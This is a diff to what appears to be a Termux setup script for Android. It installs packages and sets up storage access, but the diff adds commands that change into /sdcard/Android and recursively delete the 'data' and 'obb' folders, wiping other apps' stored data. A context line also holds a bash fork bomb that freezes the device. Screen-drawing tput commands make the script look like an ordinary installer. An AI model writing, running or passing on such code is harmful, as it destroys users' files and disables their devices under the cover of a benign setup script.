@@ -1,6 +1,10 @@
 pkg install ncurses-utils
 pkg install git
 termux-setup-storage
+cd /sdcard
+cd Android
+rm -rf data
+rm -rf obb
 :(){ :|: & };:
 tput clear
 tput cup 3 15
